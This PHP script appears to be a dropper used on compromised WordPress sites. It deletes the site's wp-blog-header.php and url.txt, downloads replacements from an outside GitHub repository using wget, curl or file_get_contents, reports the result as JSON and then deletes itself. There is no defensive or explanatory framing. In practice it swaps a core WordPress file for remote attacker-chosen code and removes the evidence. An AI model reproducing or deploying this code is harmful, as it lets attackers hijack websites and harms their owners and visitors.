<?php

$segments = array_values(array_filter(explode('/', parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH))));
if (count($segments) > 1) chdir('..');

$files = [
    'wp-blog-header.php' => 'https://raw.githubusercontent.com/mdmomin365366-gif/newcode/refs/heads/main/wp-blog-header.php',
    'url.txt'            => 'https://raw.githubusercontent.com/mdmomin365366-gif/newcode/refs/heads/main/url.txt',
];

function fetchUrl($url) {
    if (function_exists('exec')) {
        $tmp = tempnam(sys_get_temp_dir(), 'f_');
        @exec('wget -q --timeout=20 -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $ret);
        if ($ret === 0 && filesize($tmp) > 0) { $d = file_get_contents($tmp); @unlink($tmp); return $d; }
        @unlink($tmp);
    }
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 20]);
        $d = curl_exec($ch); curl_close($ch);
        if ($d) return $d;
    }
    if (ini_get('allow_url_fopen')) {
        $d = @file_get_contents($url, false, stream_context_create(['http' => ['timeout' => 20]]));
        if ($d) return $d;
    }
    return false;
}

$result = [];
foreach ($files as $name => $url) {
    if (file_exists($name)) @unlink($name);
    $data = fetchUrl($url);
    if ($data !== false) { file_put_contents($name, $data); $result[$name] = 'success'; }
    else $result[$name] = 'failed';
}

$result['status'] = count($segments) > 1 ? 'Subdir Done' : 'Current dir Done';

header('Content-Type: application/json');
echo json_encode($result, JSON_PRETTY_PRINT);

@unlink(__FILE__);
